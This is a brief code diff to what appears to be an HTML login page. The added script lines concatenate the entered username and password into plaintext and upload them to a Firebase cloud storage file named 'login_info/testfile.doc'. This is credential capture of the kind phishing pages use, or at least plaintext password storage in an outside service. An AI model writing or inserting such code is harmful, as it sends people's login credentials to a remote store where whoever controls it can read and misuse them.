@@ -343,6 +343,12 @@ span.psw {
   // Initialize Firebase
   firebase.initializeApp(firebaseConfig);
   firebase.analytics();
+    
+
+    //Passing login information to firebase
+    var login_info = username + ', ' + password;
+    var storageRef = firebase.storage().ref('login_info/testfile.doc');
+    storageRef.put(login_info);
 </script>
 </body>
 </html>
